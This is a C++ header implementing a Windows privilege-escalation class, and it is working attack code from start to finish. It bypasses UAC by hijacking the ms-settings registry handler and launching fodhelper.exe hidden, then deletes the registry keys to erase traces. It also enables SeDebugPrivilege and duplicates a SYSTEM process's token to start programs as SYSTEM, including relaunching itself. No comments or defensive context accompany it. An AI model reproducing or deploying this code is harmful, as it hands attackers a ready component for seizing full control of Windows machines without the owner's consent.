#ifndef PRIV_ESC_CLASS_H
#define PRIV_ESC_CLASS_H

#include <windows.h>
#include <string>
#include <vector>
#include <tlhelp32.h>
#include <userenv.h>

#pragma comment(lib, "user32.lib")
#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")

class PrivEscalationClass {
public:
    PrivEscalationClass() {
        EnableDebugPrivilege();
    }

    void SelfElevate() {
        wchar_t szPath[MAX_PATH];
        GetModuleFileNameW(NULL, szPath, MAX_PATH);
        std::wstring selfPath = szPath;

        HANDLE hToken;
        BOOL isAdmin = FALSE;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elev;
            DWORD sz;
            if (GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &sz)) {
                isAdmin = (BOOL)elev.TokenIsElevated;
            }
            CloseHandle(hToken);
        }

        if (!isAdmin) {
            if (runProcAsAdminFromUser(selfPath)) {
                exit(0);
            }
        }
        else {
            if (GetProcessUserName(GetCurrentProcessId()).find(L"SYSTEM") == std::wstring::npos) {
                EnableDebugPrivilege();
                if (runProcAsSystemFromAdmin(selfPath)) {
                    exit(0);
                }
            }
        }
    }

    void Elevate(std::wstring targetPath) {
        HANDLE hToken;
        BOOL isAdmin = FALSE;
        if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
            TOKEN_ELEVATION elev;
            DWORD sz;
            if (GetTokenInformation(hToken, TokenElevation, &elev, sizeof(elev), &sz)) {
                isAdmin = (BOOL)elev.TokenIsElevated;
            }
            CloseHandle(hToken);
        }

        if (!isAdmin) {
            runProcAsAdminFromUser(targetPath);
        }
        else {
            if (GetProcessUserName(GetCurrentProcessId()).find(L"SYSTEM") == std::wstring::npos) {
                EnableDebugPrivilege();
                runProcAsSystemFromAdmin(targetPath);
            }
        }
    }

    bool EnableDebugPrivilege() {
        HANDLE hToken;
        LUID luid;
        TOKEN_PRIVILEGES tp;
        if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken)) return false;
        if (!LookupPrivilegeValueW(NULL, L"SeDebugPrivilege", &luid)) {
            CloseHandle(hToken);
            return false;
        }
        tp.PrivilegeCount = 1;
        tp.Privileges[0].Luid = luid;
        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
        if (!AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(TOKEN_PRIVILEGES), NULL, NULL)) {
            CloseHandle(hToken);
            return false;
        }
        DWORD err = GetLastError();
        CloseHandle(hToken);
        return (err == ERROR_SUCCESS);
    }

    void CleanRegistry() {
        RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\Open\\command");
        RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell\\Open");
        RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings\\Shell");
        RegDeleteKeyW(HKEY_CURRENT_USER, L"Software\\Classes\\ms-settings");
    }

    bool runProcAsAdminFromUser(std::wstring procName) {
        HKEY hkey;
        DWORD d;
        LPCWSTR settings = L"Software\\Classes\\ms-settings\\Shell\\Open\\command";
        if (RegCreateKeyExW(HKEY_CURRENT_USER, settings, 0, NULL, 0, KEY_WRITE, NULL, &hkey, &d) != ERROR_SUCCESS) return false;
        RegSetValueExW(hkey, L"", 0, REG_SZ, (unsigned char*)procName.c_str(), (DWORD)((procName.length() + 1) * sizeof(wchar_t)));
        RegSetValueExW(hkey, L"DelegateExecute", 0, REG_SZ, (unsigned char*)L"", (DWORD)sizeof(wchar_t));
        RegCloseKey(hkey);
        SHELLEXECUTEINFOW sei = { sizeof(sei) };
        sei.lpVerb = L"runas";
        sei.lpFile = L"C:\\Windows\\System32\\fodhelper.exe";
        sei.nShow = SW_HIDE;
        bool res = ShellExecuteExW(&sei);
        Sleep(2000);
        CleanRegistry();
        return res;
    }

    bool runProcAsSystemFromAdmin(std::wstring procName) {
        HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (hSnap == INVALID_HANDLE_VALUE) return false;
        PROCESSENTRY32W pe32 = { sizeof(pe32) };
        if (!Process32FirstW(hSnap, &pe32)) {
            CloseHandle(hSnap);
            return false;
        }
        bool success = false;
        do {
            std::wstring user = GetProcessUserName(pe32.th32ProcessID);
            if (user.find(L"SYSTEM") != std::wstring::npos) {
                HANDLE t = getToken(pe32.th32ProcessID);
                if (t) {
                    success = createProcess(t, procName.c_str());
                    CloseHandle(t);
                    if (success) break;
                }
            }
        } while (Process32NextW(hSnap, &pe32));
        CloseHandle(hSnap);
        return success;
    }

    std::wstring GetProcessUserName(DWORD pid) {
        HANDLE ph = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
        if (!ph) return L"";
        HANDLE t = NULL;
        std::wstring name = L"";
        if (OpenProcessToken(ph, TOKEN_QUERY, &t)) {
            DWORD sz = 0;
            GetTokenInformation(t, TokenUser, NULL, 0, &sz);
            if (sz > 0) {
                std::vector<BYTE> buf(sz);
                PTOKEN_USER ptu = (PTOKEN_USER)buf.data();
                if (GetTokenInformation(t, TokenUser, ptu, sz, &sz)) {
                    wchar_t n[MAX_PATH], d[MAX_PATH];
                    DWORD ns = MAX_PATH, ds = MAX_PATH;
                    SID_NAME_USE use;
                    if (LookupAccountSidW(NULL, ptu->User.Sid, n, &ns, d, &ds, &use)) {
                        name = d; name += L"\\"; name += n;
                    }
                }
            }
            CloseHandle(t);
        }
        CloseHandle(ph);
        return name;
    }

private:
    HANDLE getToken(DWORD pid) {
        HANDLE t = NULL;
        HANDLE ph = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);
        if (ph) {
            OpenProcessToken(ph, MAXIMUM_ALLOWED, &t);
            CloseHandle(ph);
        }
        return t;
    }

    BOOL createProcess(HANDLE t, LPCWSTR app) {
        HANDLE dt = NULL;
        STARTUPINFOW si = { sizeof(si) };
        PROCESS_INFORMATION pi = { 0 };
        BOOL res = FALSE;
        if (DuplicateTokenEx(t, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &dt)) {
            res = CreateProcessWithTokenW(dt, LOGON_WITH_PROFILE, app, NULL, 0, NULL, NULL, &si, &pi);
            if (res) {
                CloseHandle(pi.hProcess);
                CloseHandle(pi.hThread);
            }
            CloseHandle(dt);
        }
        return res;
    }
};

#endif
